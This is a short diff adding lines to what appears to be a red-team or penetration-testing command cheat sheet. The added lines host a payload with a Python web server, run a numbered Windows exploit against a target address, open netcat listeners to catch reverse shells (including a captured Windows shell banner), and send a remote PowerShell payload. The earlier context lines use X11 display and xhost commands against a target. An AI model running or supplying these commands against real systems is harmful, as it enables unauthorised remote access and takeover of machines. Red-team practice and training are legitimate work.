@@ -46,3 +46,26 @@ p.waitFor()
 xterm -display x.x.x.x:1
 Xnest :1
 xhost +targetip
+
+
+
+#Host a filefile
+python2.7 -m SimpleHTTPServer 80
+
+#Run a reverse for Windows exploit(39161)
+python2.7 exploit.py x.x.x.x 80
+
+#Connect backshell
+nc -lvp 60001
+Connection from x.x.x.x:49191
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+
+
+
+#Run Powershell exploit payload
+#Run the Listener on the Redteam(Attacker)
+#Run the Remote powershell exploit on the Redteam(Attacker)
+$nc -lvp 60002
+python send_powershell_payload.py x.x.x.x LHOST 60002
